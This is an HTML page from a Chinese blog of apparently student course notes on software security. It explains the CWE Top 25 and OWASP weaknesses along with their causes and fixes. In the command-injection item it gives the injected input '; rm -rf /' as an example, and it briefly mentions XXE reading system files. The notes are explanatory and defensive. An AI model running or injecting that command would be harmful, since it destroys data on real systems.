+          <a href="#24-对重要的功能没有进行权限认证" class="heading-link"><i class="fas fa-link"></i></a>24.对重要的功能没有进行权限认证</h3>
+      
+        <h3 id="25-用户权限问题"   >
+          <a href="#25-用户权限问题" class="heading-link"><i class="fas fa-link"></i></a>25.用户权限问题</h3>
+      
+        <h2 id="2-2-Top-25-软件安全问题产生的原因"   >
+          <a href="#2-2-Top-25-软件安全问题产生的原因" class="heading-link"><i class="fas fa-link"></i></a>2.2 Top 25 软件安全问题产生的原因</h2>
+      <ol>
+<li><p>html中遇到\<script\>标签会执行其中的js代码,攻击者可以在输入框注入闭合的script标签,并执行中间的js代码,<br>攻击者可以轻松的获取用户的会话,cookie和密码等信息</p>
+</li>
+<li><p>c语言指针可以访问内存, 数组名是一个指针, 如果使用数组长度之外的下标访问数组,<br>就可能会写入其他内存区域, 造成不可预知的后果</p>
+</li>
+<li><p>输入的时候没有进行合理的校验就输出或者入库, 就会造成这种情况, 比如<br>商品数量输入为负数就会使得计算总价的时候出现错误</p>
+</li>
+<li><p>c语言指针可以访问内存, 数组名是一个指针, 如果使用数组长度之外的下标访问数组,<br>就可能会读出其他内存区域, 造成不可预知的后果</p>
+</li>
+<li><p>c语言指针可以访问内存, 数组名是一个指针,<br>当你通过缓冲区的字符串写入到c语言的数组时,<br>可能会出现写入比原本数组长度还长得内容, 就会造成不可知的错误</p>
+</li>
+<li><p>当通过ODBC操作数据库的时候,<br>有的时候会把用户输入的内容拼接到SQL语句中再执行这个SQL语句,<br>这时如果攻击者在输入字符串的时候使用单引号,<br>并在中间输入一些SQL语句就可以操作数据库, 如果攻击者猜对了表名, 他可以删库,<br>或者修改其中的信息</p>
+</li>
+<li><p>程序在处理用户身份验证或者用户登陆的时候的代码出现错误</p>
+</li>
+<li><p>C语言释放内存后再访问对应的内存就会造成不可预知的结果</p>
+</li>
+<li><p>当你在网站A登录后, 本地会存储cookie, 这时进入恶意网站B时,<br>可以通过跨域标签如\<img\>, \<script\> 等方式对A网站发送网络请求,<br>进而威胁用户安全</p>
+</li>
+<li><p>有的网页的输入会直接进入操作系统的shell控制台执行,<br>这时如果写入一些危险的命令就会导致漏洞, 比如输入<code>; rm -rf /</code><br>进入linux的shell中就会删除所有文件</p>
+</li>
+<li><p>输入的整数值太大以至于超出数据类型的表示范围，该值可能会变成非常小的值或是负数。这可能会带来安全后果，如程序崩溃、无限循环、缓冲区溢出等，这在<br>C 和 C++ 编写的程序中尤其常见</p>
+</li>
+<li><p>通过输入 “..” 和 “/“<br>之类的符号，攻击者可能可以逃脱受限位置，访问到系统上的其他位置的文件或目录。同时，注入空字节可能可以截断生成的文件名，从而实现生成任意格式的文件以扩大攻击范围</p>
+</li>
+<li><p>当应用程序解除引用一个空指针时，可能会导致程序崩溃</p>
+</li>
+<li><p>身份验证的逻辑设计不足或不正确，使得用户可能可以访问到其本来没有权限访问的资源。如使用备用通道、备用用户绕过身份验证</p>
+</li>
+<li><p>如果不限制用户上传文件的类型，用户可能可以上传一些可在环境中自动运行和处理的危险文件，如批处理文件和<br>shell 脚本等</p>
+</li>
+<li><p>如果允许非预期的用户可以访问一些关键资源，可能会导致敏感信息的暴露和资源的意外修改</p>
+</li>
+<li><p>当软件允许用户输入代码语法时，攻击者有可能编写改变软件预期控制流的方式设计代码，从而导致任意代码的执行</p>
+</li>
+<li><p>对用户凭证的保护不足，如采用明文或对称加密的方式存储和传输密码，攻击者有可能取得用户凭证</p>
+</li>
+<li><p>XML 中可能包含带有 URI 的外部实体，这些 URI<br>可能会导致超出预期的控制范围，从而导致数据暴露，如在 URI 中指定文件<br>C:\Winnt\win.ini，就可能会导致输出内容夹带系统文件和密码</p>
+</li>
+<li><p>硬编码的凭据通常会导致重大漏洞，攻击者可能可以从二进制文件中反编译，提取到密码和加密密钥等关键信息</p>
+</li>
+<li><p>如果反序列化的数据或代码缺乏保护，则可以在不使用提供的访问器的情况下对其进行修改，攻击者可能会利用它们执行未经授权的操作，例如生成实体类</p>
+</li>
+<li><p>软件无法正确分配、修改、跟踪、检查用户权限，从而可能导致用户拥有意外的控制范围</p>
+</li>
+<li><p>服务器是有一定承载能力的,当服务器需要处理过多的服务比如写入太多数据,<br>处理太多网络请求的时候就会造成服务器的资源失控, 导致服务器宕机等问题</p>
+</li>
+<li><p>对于某些功能调用的时候没有进行权限认证导致系统出错,<br>比如一个不能创建账号的用户创建了账号</p>
+</li>
+<li><p>系统设计的时候没有对权限进行合理划分,<br>对于系统某些功能或数据的访问没有进行权限的认证和分配</p>
+</li>
+</ol>
+
+        <h2 id="2-3-Top-25-软件安全问题的解决方案"   >
+          <a href="#2-3-Top-25-软件安全问题的解决方案" class="heading-link"><i class="fas fa-link"></i></a>2.3 Top 25 软件安全问题的解决方案</h2>
+      <ol>
+<li><p>对输出进行编码, 保证显示的输出都是字符型, 没有script标签</p>
+<ul>
+<li><p>对输入框验证, 不允许出现\&lt; ,/ 等特殊字符</p>
+</li>
+<li><p>对cookie, session加密</p>
+</li>
+</ul>
+</li>
+<li><p>使用具有智能指针的语言(Go,Rust)或者没有指针的语言(java,python)</p>
+<ul>
+<li>使用指针的时候检查是否越界</li>
+</ul>
+</li>
+<li><p>任何输入和入库的操作之前都要做好参数校验</p>
+</li>
+<li><p>在读出的时候做好参数校验</p>
+<ul>
+<li>使用具有智能指针的语言(Go,Rust)或者没有指针的语言(java,python)</li>
+</ul>
+</li>
+<li><p>每次使用缓冲区的时候都要校验长度</p>
+</li>
+<li><p>输入校验, 不允许特殊字符</p>
+<ul>
+<li>对用户的输入进行编码</li>
+</ul>
+</li>
+<li><p>设置多级权限和多层权限管理来限制用户对于数据的访问</p>
+</li>
+<li><p>释放内存后不再访问指针对应的内存区域</p>
+</li>
+<li><p>不用Get请求来增删改数据</p>
+<ul>
+<li>双重cookie认证</li>
+</ul>
+</li>
+<li><p>隔离运行, 使用docker技术</p>
+<ul>
+<li><p>输入校验</p>
+</li>
+<li><p>输入重新编码</p>
+</li>
+</ul>
+</li>
+<li><p>对输入的整数进行边界检查，规定输入范围</p>
+<ul>
+<li><p>尽可能使用无符号整数</p>
+</li>
+<li><p>注意 32 位和 64 位系统的整数表示范围差异</p>
+</li>
+</ul>
+</li>
+<li><p>定义输入路径的规范，拒绝任何不严格符合规范的输入</p>
+<ul>
+<li>限制可以使用的字符集</li>
+</ul>
+</li>
+<li><p>对可能被修改的指针进行完整性检查</p>
+<ul>
+<li><p>可以选择使用不易受空指针问题影响的语言</p>
+</li>
+<li><p>检查函数的返回值，验证是否为非空值</p>
+</li>
+</ul>
+</li>
+<li><p>使用身份验证框架</p>
+</li>
+<li><p>为上传的文件生成文件名，而不使用用户提供的文件名</p>
+<ul>
+<li>限制可接受的文件名和类型</li>
+</ul>
+</li>
+<li><p>检查关键资源是否具有不安全的权限</p>
+<ul>
+<li><p>将软件分为任意用户、普通用户、特权用户和管理员用户可以访问的区域</p>
+</li>
+<li><p>保证所有配置文件、可执行文件和库只有管理员可以访问</p>
+</li>
+</ul>
+</li>
+<li><p>在沙箱环境中运行代码</p>
+<ul>
+<li>采用严格的允许列表限制可用的代码</li>
+</ul>
+</li>
+<li><p>采用适当的加密技术保护凭证</p>
+<ul>
+<li>采用使用的安全机制保护凭证</li>
+</ul>
+</li>
+<li><p>将 XML 解析器配置为禁用外部实体扩展</p>
+</li>
+<li><p>将用户凭据存储在受严格保护的加密的配置文件或数据库中</p>
+<ul>
+<li><p>检查并限制哪些实体可以访问需要硬编码凭证</p>
+</li>
+<li><p>使用非对称加密与加随机盐存储凭证</p>
+</li>
+</ul>
+</li>
+<li><p>使用签名技术确保反序列化的数据未被篡改</p>
+<ul>
+<li><p>反序列化时验证数据流的安全性</p>
+</li>
+<li><p>明确对应最终生成的实体</p>
+</li>
+</ul>
+</li>
+<li><p>仔细进行权限的设置和管理</p>
+<ul>
+<li>遵循最小特权原则</li>
+</ul>
+</li>
+<li><p>检查服务器的状态信息, 如果服务器消耗太多资源就信息预警</p>
+<ul>
+<li>使用负载均衡技术, 分配给多个服务器处理</li>
+</ul>
+</li>
+<li><p>在重要的函数做好权限认证</p>
+<ul>
+<li>设计多级权限系统来管理用户的权限</li>
+</ul>
+</li>
+<li><p>在系统设计的时候进行充分的权限认证和分配, 保证系统权限认证的合理充分</p>
+</li>
+</ol>
+
+        <h1 id="3-威胁发生的原因"   >
+          <a href="#3-威胁发生的原因" class="heading-link"><i class="fas fa-link"></i></a>3 威胁发生的原因</h1>
+      <p>正如老师上课所讲, 多有的输入都是威胁, 所有的输入都应该验证</p>
+<p>说到底就是输入造成的威胁和安全漏洞，只不过从不同的输入，通过不同的方面来进行攻击罢了。</p>
+<p>比如我上面翻译到了的：</p>
+<ol>
+<li><p>用户提交恶意数据攻击系统，例如非法注入，利用已知有缺陷组件进行攻击等。</p>
+</li>
+<li><p>客户端系统自身的漏洞，例如敏感数据的暴露，程序中含有有缺陷组件，日志和监控不足，安全配置错误等</p>
+</li>
+<li><p>web应用的漏洞，例如跨站点的脚本(XSS)，有缺陷的身份验证，安全配置错误。</p>
+</li>
+<li><p>通过序列化对象来进行通信或保存这些对象以供以后使用通常很方便。但是，如果反序列化的数据或代码不使用密码保护自身，则通常可以在没有登录访问的情况下对其进行修改。此外，任何加密仍将是客户端安全性-这是一个危险的安全性假设。</p>
+</li>
+</ol>
+<ul>
+<li><p>不受信任的数据不能被认为是好的形式（意思是它可能含有危害，不能被信任）。</p>
+<p>当开发人员对反序列化过程执行的“工具链”，或一系列实例和方法的调用没有任何限制时，攻击者有时可能会利用它们来执行未经授权的操作，例如生成外壳。</p>
+</li>
+</ul>
+<ol>
+<li>有限的资源包括内存，文件系统存储，数据库连接池条目和CPU。如果攻击者可以调用这些有限资源的分配，但是资源的数量或大小不受控制，则攻击者可能会导致计算机拒绝服务，从而消耗所有可用资源。这将阻止有效用户访问该软件，并且可能对周围环境产生影响。例如，对应用程序的内存耗尽攻击可能会降低应用程序及其主机操作系统的速度。</li>
+</ol>
+<ul>
+<li><p>至少有三种不同的情况会导致资源的消耗：</p>
+<ul>
+<li><p>缺少分配资源的数量的限制</p>
+</li>
+<li><p>在到达关闭阶段之前，丢失对资源的所有引用</p>
+</li>
+<li><p>处理后不关闭或者返回资源</p>
+</li>
+</ul>
+<p>由于以下情况的错误实施，通常会导致资源耗尽问题：</p>
+<ul>
+<li><p>错误条件和其他异常情况。</p>
+</li>
+<li><p>哪些程序负责释放资源是不确定的，令人疑惑的。</p>
+</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>假定一个用户具有给定的身份，授权是基于用户的权限以及适用于该权限的资源访问控制规范，确定该用户是否可以访问给定资源的过程。</li>
+</ol>
+<ul>
+<li>如果不应用访问控制检查，则用户可以访问数据或执行不应被允许执行的操作。这可能导致各种各样的问题，包括信息泄露，计算机拒绝服务和任意代码执行等。</li>
+</ul>
+
+        <h1 id="4-威胁的应对措施"   >
+          <a href="#4-威胁的应对措施" class="heading-link"><i class="fas fa-link"></i></a>4 威胁的应对措施</h1>
+      <ol>
+<li><p>其实像上面提到的注入问题，我们在项目开发中也经常会遇到，最经典的就是mysql的注入问题。最好的解决办法就是开发的时候，在不需要实现“用户注入”这种业务需求的情况下，直接采用某些库中的某些方法先编译sql语句，只允许接收用户的数据，这样可以有效的避免注入问题。说白了就是把用户的输入给卡死，不让用户的输入进入sql语句进行编译嘛。</p>
+</li>
+<li><p>对于客户端的漏洞，类似于Windows等操作系统提供商就在做类似的工作，通过不断的打补丁对于客户端进行升级，从而不断的提高用户端的安全性。杀毒软件其实也可以应对类似的攻击，可以检测到恶意的或者有病毒的应用并及时拦截。</p>
+</li>
+<li><p>web应用方面的威胁实际上和用户本身的浏览是分不开的，尽量浏览正规的网站，减少被攻击的机会。而网络这方面，随着技术的发展，新兴的技术的提出例如网站从http升级到https，实际上也在不断完善用户的隐私和安全。</p>
+</li>
+<li><p>如果可用，请使用编程语言的签名/密封功能来确保反序列化的数据不会被修改。</p>
+</li>
+<li><p>反序列化数据时，填充一个新对象，而不仅仅是反序列化。保证数据流经安全的输入验证，并且功能是安全的。</p>
+</li>
+<li><p>某些自动化的动态分析技术可以有效地发现资源耗尽问题，尤其是对于诸如进程，内存和连接之类的资源。</p>
+</li>
+<li><p>除了文件无关的系统资源（例如文件，套接字和进程）之外，自动化的静态分析通常在识别资源耗尽问题方面的实用性有限。对于系统资源，自动静态分析可能能够检测到资源过期后仍未释放的情况。自动分析配置文件可能能够检测未指定最大值的设置。</p>
+</li>
+<li><p>软件分为匿名，常规，特权和管理区域。通过仔细检查角色与数据和功能来减少攻击面。</p>
+</li>
+<li><p>使用经过审核的库或框架，该库或框架不允许发生此弱点或提供使此弱点易于避免的构造。（例如sqlx库）</p>
+</li>
+<li><p>对于Web应用程序，请确保在每个页面的服务器端正确实施了访问控制机制。</p>
+</li>
+</ol>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://zjeff-953.gitee.io/zjeff">Jeffords zuo</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://zjeff-953.gitee.io/zjeff/2021/06/25/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%20-%2005%20[%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA]%20%E5%B8%B8%E8%A7%81%E5%A8%81%E8%83%81%E5%8F%8A%E5%85%B6%E5%BA%94%E5%AF%B9%E6%8E%AA%E6%96%BD/">http://zjeff-953.gitee.io/zjeff/2021/06/25/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%20-%2005%20[%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA]%20%E5%B8%B8%E8%A7%81%E5%A8%81%E8%83%81%E5%8F%8A%E5%85%B6%E5%BA%94%E5%AF%B9%E6%8E%AA%E6%96%BD/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://zjeff-953.gitee.io/zjeff/tags/%E6%A0%87%E7%AD%BE/">标签</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2021/06/25/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%20-%2006%20%5B%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA%5D%20%E8%AE%BE%E8%AE%A1%E5%AE%89%E5%85%A8%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%92%8C%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%20-%20%E5%89%AF%E6%9C%AC/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">软件安全 - 06 [软件安全理论] 设计安全的系统和攻击面分析</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2021/06/25/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%20-%2006%20%5B%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA%5D%20%E8%AE%BE%E8%AE%A1%E5%AE%89%E5%85%A8%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%92%8C%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"><span class="paginator-prev__text">软件安全 - 06 [软件安全理论] 设计安全的系统和攻击面分析</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8-05-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA-%E5%B8%B8%E8%A7%81%E5%A8%81%E8%83%81%E5%8F%8A%E5%85%B6%E5%BA%94%E5%AF%B9%E6%8E%AA%E6%96%BD"><span class="toc-text">
+          软件安全 - 05 [软件安全理论] 常见威胁及其应对措施</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-OWASP-TOP10"><span class="toc-text">
+          1 OWASP TOP10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5"><span class="toc-text">
+          1. 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A4%B1%E6%95%88%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E5%92%8C%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86"><span class="toc-text">
+          2.失效身份验证和会话管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">
+          3.敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%88XXE%EF%BC%89"><span class="toc-text">
+          4.XML外部实体注入攻击（XXE）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%A4%B1%E6%95%88%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-text">
+          5.失效访问控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%AE%89%E5%85%A8%E6%80%A7%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE"><span class="toc-text">
+          6.安全性错误配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Cross-Site-Scripting-XSS"><span class="toc-text">
+          7.Cross-Site-Scripting(XSS)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">
+          8.不安全的反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E4%BD%BF%E7%94%A8%E5%85%B7%E6%9C%89%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%BB%84%E4%BB%B6"><span class="toc-text">
+          9.使用具有已知漏洞的组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%92%8C%E7%9B%91%E6%8E%A7%E4%B8%8D%E8%B6%B3"><span class="toc-text">
+          10.日志记录和监控不足</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-CWE-TOP-25"><span class="toc-text">
+          2 CWE TOP-25</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB-XXS"><span class="toc-text">
+          1. 跨站点脚本攻击( XXS)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5"><span class="toc-text">
+          2. 越界写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BE%93%E5%85%A5%E9%AA%8C%E8%AF%81%E4%B8%8D%E5%BD%93"><span class="toc-text">
+          3. 输入验证不当</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%87%BA"><span class="toc-text">
+          4. 越界读出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%86%85%E5%AD%98%E7%BC%93%E5%86%B2%E5%8C%BA%E5%86%85%E6%93%8D%E4%BD%9C%E7%9A%84%E4%B8%8D%E5%BD%93%E9%99%90%E5%88%B6"><span class="toc-text">
+          5. 内存缓冲区内操作的不当限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="toc-text">
+          6. 数据库注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%90%91%E6%9C%AA%E7%BB%8F%E6%8E%88%E6%9D%83%E7%9A%84%E5%8F%82%E4%B8%8E%E8%80%85%E6%9A%B4%E9%9C%B2%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-text">
+          7. 向未经授权的参与者暴露敏感信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E9%87%8A%E6%94%BE%E5%86%85%E5%AD%98%E5%90%8E%E4%BD%BF%E7%94%A8"><span class="toc-text">
+          8. 释放内存后使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-%EF%BC%88CSRF%EF%BC%89"><span class="toc-text">
+          9. 跨站点请求伪造 （CSRF）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">
+          10. 操作系统命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BA%A2%E5%87%BA%E5%92%8C%E7%8E%AF%E7%BB%95"><span class="toc-text">
+          11. 整数类型的溢出和环绕</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E5%AF%B9%E5%8F%97%E9%99%90%E7%9B%AE%E5%BD%95%E7%9A%84%E8%B7%AF%E5%BE%84%E5%90%8D%E9%99%90%E5%88%B6%E4%B8%8D%E5%BD%93"><span class="toc-text">
+          12. 对受限目录的路径名限制不当</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-%E7%A9%BA%E6%8C%87%E9%92%88%E8%A7%A3%E9%99%A4%E5%BC%95%E7%94%A8"><span class="toc-text">
+          13. 空指针解除引用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-%E4%B8%8D%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-text">
+          14. 不正确的身份验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-%E4%B8%8D%E5%8F%97%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%8A%E4%BC%A0%E5%8D%B1%E9%99%A9%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-text">
+          15.不受限制的上传危险类型的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-%E5%AF%B9%E5%85%B3%E9%94%AE%E8%B5%84%E6%BA%90%E7%9A%84%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E5%88%86%E9%85%8D%E4%B8%8D%E5%BD%93"><span class="toc-text">
+          16.对关键资源的访问权限分配不当</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="toc-text">
+          17.代码注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-%E5%AF%B9%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81%E7%9A%84%E4%BF%9D%E6%8A%A4%E4%B8%8D%E8%B6%B3"><span class="toc-text">
+          18.对用户凭证的保护不足</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-%E5%AF%B9-XML-%E4%B8%AD%E5%8C%85%E5%90%AB%E7%9A%84%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E9%99%90%E5%88%B6%E4%B8%8D%E5%BD%93"><span class="toc-text">
+          19.对 XML 中包含的外部实体限制不当</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%9A%84%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81"><span class="toc-text">
+          20.硬编码的用户凭证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E4%B8%8D%E5%8F%97%E4%BF%A1%E4%BB%BB%E6%95%B0%E6%8D%AE%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">
+          21.不受信任数据的反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E4%B8%8D%E5%BD%93"><span class="toc-text">
+          22.权限管理不当</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E8%80%97%E5%B0%BD"><span class="toc-text">
+          23.资源分配耗尽</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-%E5%AF%B9%E9%87%8D%E8%A6%81%E7%9A%84%E5%8A%9F%E8%83%BD%E6%B2%A1%E6%9C%89%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81"><span class="toc-text">
+          24.对重要的功能没有进行权限认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98"><span class="toc-text">
+          25.用户权限问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-Top-25-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">
+          2.2 Top 25 软件安全问题产生的原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-Top-25-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-text">
+          2.3 Top 25 软件安全问题的解决方案</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%A8%81%E8%83%81%E5%8F%91%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">
+          3 威胁发生的原因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E5%A8%81%E8%83%81%E7%9A%84%E5%BA%94%E5%AF%B9%E6%8E%AA%E6%96%BD"><span class="toc-text">
+          4 威胁的应对措施</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://gitee.com/zjeff-953/picsBed/raw/master/image/cat.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">Keep Curious</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/github" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://www.zhihu.com/" target="_blank" rel="noopener" data-popover="知乎" data-popover-pos="up"><span class="sidebar-ov-social-item__icon">知</span></a><a class="sidebar-ov-social-item" href="1572754810" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a><a class="sidebar-ov-social-item" href="https://gitee.com/zjeff-953" target="_blank" rel="noopener" data-popover="码云" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-git"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">185</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">29</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">47</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Jeffords zuo</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" 